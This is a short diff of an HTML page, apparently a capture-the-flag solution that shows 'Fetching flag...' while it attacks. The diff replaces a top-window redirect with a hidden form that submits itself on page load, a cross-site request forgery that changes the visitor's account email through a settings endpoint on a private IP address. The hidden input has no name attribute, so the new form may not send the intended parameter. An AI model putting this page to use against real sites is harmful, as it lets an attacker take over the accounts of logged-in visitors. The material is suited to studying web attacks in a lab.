@@ -8,9 +8,15 @@
   <body>
     <p>Fetching flag...</p>
 
+    <form
+      id="csrf"
+      action="http://100.101.228.35:6009/settings/email"
+      method="GET"
+    >
+      <input type="hidden" value="newemail@example.com" />
+    </form>
     <script>
-      window.top.location.href =
-        "http://100.101.228.35:6009/settings/email?new=newemail%40example.com";
+      document.getElementById("csrf").submit();
     </script>
   </body>
 </html>
